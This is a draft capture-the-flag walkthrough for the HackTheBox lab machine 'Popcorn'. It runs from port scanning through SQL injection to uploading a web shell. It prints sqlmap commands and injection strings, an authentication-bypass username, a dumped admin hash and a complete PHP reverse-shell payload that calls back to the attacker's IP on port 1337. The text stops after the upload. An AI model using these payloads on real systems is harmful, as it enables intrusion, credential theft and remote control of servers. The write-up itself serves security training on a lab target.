@@ -1,0 +1,770 @@
+I"^�<p>DRAFT: Walkthrough for POPCORN - 10.10.10.6</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>First we assign the ip addresses to a local variables:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TARGET</span><span class="o">=</span>10.10.10.6
+<span class="nv">ATTACK</span><span class="o">=</span>10.10.14.34
+</code></pre></div></div>
+
+<p>We run the nmap scan (avoiding the ping) to identify the running services:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nv">$TARGET</span> <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<p>This gives me the following output</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.6
+Host is up (0.046s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Immediately this looks like a Linux webserver, I kick up the gas to a more aggressive and focused scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">--script</span><span class="o">=</span>http-enum <span class="nv">$TARGET</span> <span class="nt">-Pn</span> <span class="nt">-p</span> 80
+</code></pre></div></div>
+
+<p>and get the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.6
+Host is up (0.042s latency).
+ 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
+|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
+80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
+|_http-server-header: Apache/2.2.12 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.32 (95%), Linux 2.6.35 (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Linux 2.6.17 (95%), Linux 2.6.30 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (94%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Android 2.3.5 (Linux 2.6) (94%), Epson WF-2660 printer (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   39.30 ms 10.10.14.1
+2   39.38 ms 10.10.10.6
+</code></pre></div></div>
+
+<p>Two open ports don’t seem like a lot, but one of them is HTTP. Time for some analysis</p>
+
+<h2 id="triage">Triage</h2>
+
+<p>Immediately I’m reluctant to look at the SSH service as it’s behind authentication. I’ll park that for later and look at the web app.</p>
+
+<p>At this point most folks break out dirbuster or go buster, but we’ll crack on with nmap.
+I set a fast time scan with 20 parallel channels to run the http-enum directories and files against Popcorn on port 80</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-T5</span> <span class="nt">--max-parallelism</span><span class="o">=</span>20 <span class="nt">--script</span><span class="o">=</span>http-enum <span class="nv">$TARGET</span> <span class="nt">-Pn</span> <span class="nt">-p</span> 80
+</code></pre></div></div>
+<p>within a few seconds I get the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.6
+Host is up (0.045s latency).
+ 
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /test/: Test page
+|   /test.php: Test page
+|   /test/logon.html: Jetty
+|_  /icons/: Potentially interesting folder w/ directory listing
+</code></pre></div></div>
+
+<p>This uses a default wordlist with common directories and filenames.
+Useful to get started with for general analysis, but we want to dig deeper.</p>
+
+<p>When dealing with web apps I like to spider into directories using a directory wordlist from dirbuster called <strong>directory-list-2.3-medium.txt</strong>.</p>
+
+<p>This file is larger than the basic enum scripts available with nmap, but not so large that it will take forever to complete.</p>
+
+<p>Nmap’s http-enum script uses the resources of the nikto web scanner to perform its enumeration, and while most folks break out a scan with dirbuster or gobuster, I usually follow up nmap scanning with nikto and move to ZAP with dirbuster if I have to use something with a GUI.</p>
+
+<p>Nikto can perform a dir enum via the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nikto <span class="nt">-h</span> <span class="nv">$TARGET</span> <span class="nt">-mutate</span> 6 <span class="nt">-mutate-options</span> directory-list-2.3-medium.txt
+</code></pre></div></div>
+
+<p>The mutate option is on the deprecated hit-list for this tool, as an alternate we can specify the attack vector via a plugin mode:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nikto <span class="nt">-h</span> <span class="nv">$TARGET</span> <span class="nt">-Plugins</span> <span class="s2">"@@DEFAULT;dictionary(dictionary:/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)"</span>
+</code></pre></div></div>
+
+<p>Soon we begin to see a return:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------------------------------------------------------------------------
++ Target IP:          10.10.10.6
++ Target Hostname:    10.10.10.6
++ Target Port:        80
++ Start Time:         2018-02-11 21:19:24 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.12 (Ubuntu)
++ Server may leak inodes via ETags, header found with file /, inode: 43621, size: 177, mtime: Fri Mar 17 17:07:05 2017
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Uncommon header 'tcn' found, with contents: choice
++ Found file /index
++ Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
++ Found file /test
++ Found file /torrent
++ Found file /rename
+</code></pre></div></div>
+
+<p>Unlike some nmap scripts, nikto is non invasive. Without specifying a plugin/mutation the default operation provides ample information to add to our enumeration. Which we can trigger on specific directories with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nikto <span class="nt">-h</span> <span class="nv">$TARGET</span>/torrent/
+</code></pre></div></div>
+
+<p>We should take care to note however that weaknesses are the result of a light probing and are therefore not always accurate, any findings here will need a manual follow up.</p>
+
+<p>Back to the dir enum. As there are 220,000+ urls to check we’ll crack on with the manual analysis in a different terminal.</p>
+
+<p>/torrent and /rename are both interesting finds, lets cURL them:</p>
+
+<p>starting with rename we get a redirect, so I follow it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-kiL</span> <span class="nv">$TARGET</span>/rename
+</code></pre></div></div>
+
+<p>to get:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 301 Moved Permanently
+Date: Sat, 11 Feb 2018 21:29:13 GMT
+Server: Apache/2.2.12 (Ubuntu)
+Location: http://10.10.10.6/rename/
+Vary: Accept-Encoding
+Content-Length: 309
+Content-Type: text/html; charset=iso-8859-1
+ 
+HTTP/1.1 200 OK
+Date: Sat, 11 Feb 2018 21:29:13 GMT
+Server: Apache/2.2.12 (Ubuntu)
+X-Powered-By: PHP/5.2.10-2ubuntu6.10
+Vary: Accept-Encoding
+Content-Length: 95
+Content-Type: text/html
+ 
+Renamer API Syntax: index.php?filename=old_file_path_an_name&amp;newfilename=new_file_path_and_name
+</code></pre></div></div>
+
+<p>Interesting, a couple of variables that might allow us to do some file enumeration. I park this just now as I wonder if I can use it to read configs specified in the php.info() details from the /test URL.</p>
+
+<p>On to torrent, which also bounces me through a redirect but takes me to a full on webapp:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-kiL</span> <span class="nv">$TARGET</span>/torrent
+</code></pre></div></div>
+
+<p>Just the headers this time:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-kIL</span> <span class="nv">$TARGET</span>/torrent
+</code></pre></div></div>
+
+<p>Gives us:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 301 Moved Permanently
+Date: Sat, 11 Feb 2018 21:40:47 GMT
+Server: Apache/2.2.12 (Ubuntu)
+Location: http://10.10.10.6/torrent/
+Vary: Accept-Encoding
+Content-Type: text/html; charset=iso-8859-1
+ 
+HTTP/1.1 200 OK
+Date: Sat, 11 Feb 2018 21:40:47 GMT
+Server: Apache/2.2.12 (Ubuntu)
+X-Powered-By: PHP/5.2.10-2ubuntu6.10
+Set-Cookie: PHPSESSID=b0a2662beb823b3bc800b2b3723549b0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: private
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div></div>
+
+<p>At this point we need to get the browser involved, spinning up FireFox I go to http://10.10.10.6/torrent/ to find a full fledged web app.</p>
+
+<p><img src="/assets/htb_stuff/popcorn/torrent_hoster.png" alt="torrent_hoster.png" /></p>
+
+<p>From here I can interact with the site, even create a profile and register as a user.</p>
+
+<p><img src="/assets/htb_stuff/popcorn/make_user.png" alt="make_user.png" /></p>
+
+<p>Because there is no email validation I can just login with the user I made!
+At this point my triage begins to bear fruit as now I can interact with the website as an authenticated user.</p>
+
+<p>At this point I can begin to start looking for a way to exploit the system.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>First I’m going to look for known issues, checking searchsploit with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit torrent hoster
+</code></pre></div></div>
+
+<p>gives me a single exploit:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-------------------------------------------------------------------------- ----------------------------------------
+Exploit Title                                                            |  Path
+                                                                         | (/usr/share/exploitdb/)
+-------------------------------------------------------------------------- ----------------------------------------
+Torrent Hoster - Remount Upload                                           | exploits/php/webapps/11746.txt
+-------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p>examining the exploit with</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-x</span> 11746
+</code></pre></div></div>
+
+<p>It looks like there are a few syntax issues but the exploit suggests that we have a way to upload code execution. Since I have an authenticated user this could be the way in, but let’s poke about to make sure the required components are there.</p>
+
+<p>I want a vanilla connection experience to debug this, so I log out first.</p>
+
+<p>Going through the exploit I see the following urls:</p>
+
+<ol>
+  <li>torrenthoster/torrents.php?mode=upload</li>
+  <li>torrenthoster/upload.php</li>
+  <li>torrenthoster/torrents/</li>
+  <li>torrenthoster/users/forgot_password.php/</li>
+</ol>
+
+<p>Assuming torrenthoster is the root url for the webapp i change it to torrent and visit the following urls in the browser:</p>
+
+<ol>
+  <li>http://10.10.10.6/torrent/torrents.php?mode=upload</li>
+  <li>http://10.10.10.6/torrent/upload.php</li>
+  <li>http://10.10.10.6/torrent/torrents/</li>
+  <li>http://10.10.10.6/torrent/users/forgot_password.php/</li>
+</ol>
+
+<p>http://10.10.10.6/torrent/torrents.php?mode=upload bounces back to what looks like the index, I maybe need to be authenticated to view it.</p>
+
+<p>http://10.10.10.6/torrent/upload.php and http://10.10.10.6/torrent/torrents/ both return white empty pages in the browser, suggesting they load something but what? At this stage I can’t say.</p>
+
+<p>http://10.10.10.6/torrent/users/forgot_password.php/ returns a reset your password form page as expected</p>
+
+<p>Lets curl the pages:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-Ik</span> http://<span class="nv">$TARGET</span>/torrent/torrents.php?mode<span class="o">=</span>upload
+</code></pre></div></div>
+
+<p>returns:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Date: Sat, 11 Feb 2018 21:43:13 GMT
+Server: Apache/2.2.12 (Ubuntu)
+X-Powered-By: PHP/5.2.10-2ubuntu6.10
+Set-Cookie: PHPSESSID=21d435352fe9a2616b32bd5252003068; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: private
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div></div>
+
+<p>I also returns a similar responses from the other urls, but no Cookie settings with</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> http://<span class="nv">$TARGET</span>/torrent/torrents/
+curl <span class="nt">-ik</span> http://<span class="nv">$TARGET</span>/torrent/upload.php
+</code></pre></div></div>
+
+<p>When I run the curl commands with the -i flags on those, /torrents/ returns the same details but:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-ik</span> http://<span class="nv">$TARGET</span>/torrent/upload.php
+</code></pre></div></div>
+
+<p>gives me debugging page, which is near the bottom leaks some useful information about the dB:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;b&gt;</span>Warning<span class="nt">&lt;/b&gt;</span>:  mysql_query() [<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'function.mysql-query'</span><span class="nt">&gt;</span>function.mysql-query<span class="nt">&lt;/a&gt;</span>]: Access denied for user 'www-data'@'localhost' (using password: NO) in <span class="nt">&lt;b&gt;</span>/var/www/torrent/upload.php<span class="nt">&lt;/b&gt;</span> on line <span class="nt">&lt;b&gt;</span>443<span class="nt">&lt;/b&gt;&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;b&gt;</span>Warning<span class="nt">&lt;/b&gt;</span>:  mysql_query() [<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'function.mysql-query'</span><span class="nt">&gt;</span>function.mysql-query<span class="nt">&lt;/a&gt;</span>]: A link to the server could not be established in <span class="nt">&lt;b&gt;</span>/var/www/torrent/upload.php<span class="nt">&lt;/b&gt;</span> on line <span class="nt">&lt;b&gt;</span>443<span class="nt">&lt;/b&gt;&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;b&gt;</span>Fatal error<span class="nt">&lt;/b&gt;</span>:  Call to undefined function sqlerr() in <span class="nt">&lt;b&gt;</span>/var/www/torrent/upload.php<span class="nt">&lt;/b&gt;</span> on line <span class="nt">&lt;b&gt;</span>443<span class="nt">&lt;/b&gt;&lt;br</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Now I know for sure that we are using MySQL, if I can get a sql injection I can try and exploit the server with sqlmap.</p>
+
+<p>back to the login page: http://10.10.10.6/torrent/login.php, viewing the source code for the form:</p>
+
+<p><img src="/assets/htb_stuff/popcorn/inputs.png" alt="inputs.png" /></p>
+
+<p>I can pull out the 2 variables, username and password.
+Using an attack proxy like ZAP I can follow the login process to failure and determine the POST method is used. This gives me the syntax:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u http://$TARGET/torrent/login.php --data="username=pwnd&amp;password=pwnd" --method POST --dbms MySQL --thread=5 --tables
+</code></pre></div></div>
+
+<p>quickly the tool comes back with</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+</code></pre></div></div>
+
+<p>I up the level and risk to 1, but avoid following any redirects to get:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable
+</code></pre></div></div>
+
+<p>I can work with this to manually exploit if needed, I let the tests and eventually after trying a few different interactive options get the following results:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap identified the following injection point(s) with a total of 380 HTTP(s) requests:
+---
+Parameter: username (POST)
+   Type: boolean-based blind
+   Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+   Payload: username=pwnd' OR NOT 2740=2740#&amp;password=pwnd
+ 
+   Type: error-based
+   Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+   Payload: username=pwnd' AND (SELECT 8745 FROM(SELECT COUNT(*),CONCAT(0x716a786b71,(SELECT (ELT(8745=8745,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DGhR&amp;password=pwnd
+ 
+   Type: time-based blind
+   Title: MySQL &lt;= 5.0.11 AND time-based blind (heavy query)
+   Payload: username=pwnd' AND 5766=BENCHMARK(5000000,MD5(0x69424279))-- wnNK&amp;password=pwnd
+</code></pre></div></div>
+
+<p>Importantly I get the dB details:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Database: torrenthoster
+[8 tables]
++---------------------------------------+
+| ban                                   |
+| categories                            |
+| comments                              |
+| log                                   |
+| namemap                               |
+| news                                  |
+| subcategories                         |
+| users                                 |
++---------------------------------------+
+ 
+Database: information_schema
+[28 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| KEY_COLUMN_USAGE                      |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+</code></pre></div></div>
+
+<p>Lets get all the goodies</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u http://$TARGET/torrent/login.php --data="password=pwnd&amp;username=pwnd" --method POST --dbms MySQL --thread=5 -a
+</code></pre></div></div>
+
+<p>This takes a little while, but eventually from <strong>~/.sqlmap/output/10.10.10.6/dump/torrenthoster/users.csv</strong> I get the admin account details:</p>
+
+<pre><code class="language-csv">id,email,joined,userName,password,privilege,lastconnect
+3,admin@yourdomain.com,2007-01-06 21:12:46,Admin,d5bfedcee289e5e05b86daad8ee3e2e2,admin,2007-01-06 21:12:46
+</code></pre>
+
+<p>Normally at this point I’d fire the password hash <code class="highlighter-rouge">d5bfedcee289e5e05b86daad8ee3e2e2</code> through a decrypter but it isn’t necessary to get logged into the app as admin.</p>
+
+<p>Because the injection point was in the login and it responded to boolean sqli on the username variable I can try a blind login.</p>
+
+<p>Now at this point an option a more aggressive option would be to force a shell with sqlmap’s os-shell flag. I’ll admit I tried it but struggled to find a writable directory for the exploit to work.</p>
+
+<p>Attacking this way isn’t my strong suit, the OSCP certification doesn’t allow autopwn attacks with this tool so I’m not so familiar with the nuances of the approach. I park this vector to go back to and research if I get nowhere with the SQLi.</p>
+
+<p>Going to the login page on the site I try the following username:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Admin' or 1=1; #
+</code></pre></div></div>
+
+<p>And I can put whatever I want as the password (but I do need to put something in this case), in effect (I hope) creating a similar sql statement to the one below</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span>
+<span class="k">FROM</span> <span class="n">users</span>
+<span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'Admin'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="o">#</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'doesn'</span><span class="n">t</span> <span class="n">matter</span> <span class="n">I</span><span class="s1">'m a comment&gt;'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>This statement will return all the details for all entries of the users table where the username is <code class="highlighter-rouge">Admin</code> or things are True (1=1). As I just said 1=1 is true SQLi will return the details of the first account in the dB with all its details as the active account to use.</p>
+
+<p>In fact when I debugged later the sql was:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">userName</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">privilege</span><span class="p">,</span> <span class="n">email</span>
+  <span class="k">FROM</span> <span class="n">users</span>
+  <span class="k">WHERE</span> <span class="n">userName</span> <span class="o">=</span> <span class="s1">''</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">''</span>
+</code></pre></div></div>
+
+<p>This works as most logins do, pass the username and the hashed version of the password to the username table.</p>
+
+<p>If the result is True, i.e. the username and password details in the table match those supplied, give me access details required for the username.</p>
+
+<p>Because our injection attack in effect becomes:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">userName</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">privilege</span><span class="p">,</span> <span class="n">email</span>
+<span class="k">FROM</span> <span class="n">users</span>
+<span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'Admin'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="o">#</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">'doesn'</span><span class="n">t</span> <span class="n">matter</span> <span class="n">I</span><span class="s1">'m a comment&gt;'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We return True on the query and a pass on the login check. This gives us the first record of the dB by default to use which is usually the root/admin, as it is needed to set up most dBs.</p>
+
+<p>The result is that this gets me an admin login, evident by the fact I can now view and edit the uploads at http://10.10.10.6/torrent/torrents.php?mode=upload</p>
+
+<p><img src="/assets/htb_stuff/popcorn/authenticated.png" alt="authenticated.png" /></p>
+
+<p>So this is pretty cool I have admin level app control, I can mess with the app as a power user.</p>
+
+<p>Now that I have a good level of access to the app I return to the exploit code to see if I can use anything. An upload vulnerability potentially allows me to get a reverse shell on the box.</p>
+
+<p>When I examined the exploit, I can honestly say this stumped me for quite a while.</p>
+
+<p>I could not really make sense the exploit, the replacement character � (&amp;#65533)  is everywhere and the code makes little sense initially.</p>
+
+<p>Looking at the source code on the upload page I could see vague similarities to the exploit but nothing concrete. Still, convinced that a file upload could be a possible vector I set up ZAP as an attack proxy on port 8080 with FireFox to record details as I run through the site manually.</p>
+
+<p>Going to the torrent directory I spy a Kali Linux torrent upload: http://10.10.10.6/torrent/index.php?mode=directory and go to it http://10.10.10.6/torrent/torrents.php?mode=details&amp;id=723bc28f9b6f924cca68ccdff96b6190566ca6b4</p>
+
+<p><img src="/assets/htb_stuff/popcorn/kali_torrent.png" alt="kali_torrent.png" /></p>
+
+<p>Which I can edit:</p>
+
+<p><img src="/assets/htb_stuff/popcorn/torrent_edit.png" alt="torrent_edit.png" /></p>
+
+<p>Beginning to suspect that I can edit the image or torrent file via this window, I could force the application to take some code injected into an image or torrent provided the area it renders on the server knows how to execute the code.</p>
+
+<p>I know I’m dealing with PhP pages, this gives me the language for my payload, now I just have to find a place that will render php content in the uploads.</p>
+
+<p>Closing down the editor I examine the torrent details and notice the image links out to:
+http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png</p>
+
+<p>I follow it, but pull one level back to see if we have Directory Listing on http://10.10.10.6/torrent/upload/ which I do:</p>
+
+<p><img src="/assets/htb_stuff/popcorn/uploads.png" alt="uploads.png" /></p>
+
+<p>This might work if I can upload a malformed image. The edit specifies this needs to be in an image format and no larger than 100Kb, a little limiting but maybe usable.</p>
+
+<p>I check the torrent link 10.10.10.6/torrent/torrents.php?mode=download&amp;id=723bc28f9b6f924cca68ccdff96b6190566ca6b4 which in theory could be big, but the url stays on the same page, with the API looking to fetch a resource from an unknown storage location. I’d need the source code to work that out, at this point a malformed image looks like a good option to try.</p>
+
+<p>First I need a payload, I’m going with a raw reverse shell that will connect back to me on port 1337 in php</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> php/reverse_php <span class="nv">lhost</span><span class="o">=</span><span class="nv">$ATTACK</span> <span class="nv">lport</span><span class="o">=</span>1337 <span class="nt">-f</span> raw
+</code></pre></div></div>
+
+<p>This gives me:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 3024 bytes
+/*&lt;php&gt;/**/
+EXPLOIT
+</code></pre></div></div>
+
+<p>Under my 100kb, that beats the size requirement. I specify a file to hold my code:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> php/reverse_php <span class="nv">lhost</span><span class="o">=</span><span class="nv">$ATTACK</span> <span class="nv">lport</span><span class="o">=</span>1337 <span class="nt">-f</span> raw <span class="nt">-o</span> evil.php
+</code></pre></div></div>
+
+<p>And try an upload, which returns <code class="highlighter-rouge">Invalid file</code>.</p>
+
+<p>This is expected as the form specifies the upload must be in image format.</p>
+
+<p>I go to ZAP to get the details, the Request data from the latest edit page is:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------6880877471789511041406832871
+Content-Disposition: form-data; name="file"; filename="evil.php"
+Content-Type: application/x-php
+ 
+   /*&lt;?php /**/
+     @error_reporting(0);
+     @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
+     $dis=@ini_get('disable_functions');
+     if(!empty($dis)){
+       $dis=preg_replace('/[, ]+/', ',', $dis);
+       $dis=explode(',', $dis);
+       $dis=array_map('trim', $dis);
+     }else{
+       $dis=array();
+     }
+    
+   $ipaddr='10.10.14.34';
+   $port=1337;
+ 
+   if(!function_exists('CkLhPZUPboOwI')){
+     function CkLhPZUPboOwI($c){
+       global $dis;
+      
+     if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
+       $c=$c." 2&gt;&amp;1\n";
+     }
+     $EPWc='is_callable';
+     $JZlmOv='in_array';
+    
+     if($EPWc('passthru')and!$JZlmOv('passthru',$dis)){
+       ob_start();
+       passthru($c);
+       $o=ob_get_contents();
+       ob_end_clean();
+     }else
+     if($EPWc('exec')and!$JZlmOv('exec',$dis)){
+       $o=array();
+       exec($c,$o);
+       $o=join(chr(10),$o).chr(10);
+     }else
+     if($EPWc('proc_open')and!$JZlmOv('proc_open',$dis)){
+       $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
+       $o=NULL;
+       while(!feof($pipes[1])){
+         $o.=fread($pipes[1],1024);
+       }
+       @proc_close($handle);
+     }else
+     if($EPWc('shell_exec')and!$JZlmOv('shell_exec',$dis)){
+       $o=shell_exec($c);
+     }else
+     if($EPWc('popen')and!$JZlmOv('popen',$dis)){
+       $fp=popen($c,'r');
+       $o=NULL;
+       if(is_resource($fp)){
+         while(!feof($fp)){
+           $o.=fread($fp,1024);
+         }
+       }
+       @pclose($fp);
+     }else
+     if($EPWc('system')and!$JZlmOv('system',$dis)){
+       ob_start();
+       system($c);
+       $o=ob_get_contents();
+       ob_end_clean();
+     }else
+     {
+       $o=0;
+     }
+  
+       return $o;
+     }
+   }
+   $nofuncs='no exec functions';
+   if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
+     $s=@fsockopen("tcp://10.10.14.34",$port);
+     while($c=fread($s,2048)){
+       $out = '';
+       if(substr($c,0,3) == 'cd '){
+         chdir(substr($c,3,-1));
+       } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+         break;
+       }else{
+         $out=CkLhPZUPboOwI(substr($c,0,-1));
+         if($out===false){
+           fwrite($s,$nofuncs);
+           break;
+         }
+       }
+       fwrite($s,$out);
+     }
+     fclose($s);
+   }else{
+     $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+     @socket_connect($s,$ipaddr,$port);
+     @socket_write($s,"socket_create");
+     while($c=@socket_read($s,2048)){
+       $out = '';
+       if(substr($c,0,3) == 'cd '){
+         chdir(substr($c,3,-1));
+       } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
+         break;
+       }else{
+         $out=CkLhPZUPboOwI(substr($c,0,-1));
+         if($out===false){
+           @socket_write($s,$nofuncs);
+           break;
+         }
+       }
+       @socket_write($s,$out,strlen($out));
+     }
+     @socket_close($s);
+   }
+ 
+-----------------------------6880877471789511041406832871
+Content-Disposition: form-data; name="submit"
+ 
+Submit Screenshot
+-----------------------------6880877471789511041406832871--
+ 
+</code></pre></div></div>
+
+<p>Note we specify the content type header in our submission as <code class="highlighter-rouge">Content-Type: application/x-php</code></p>
+
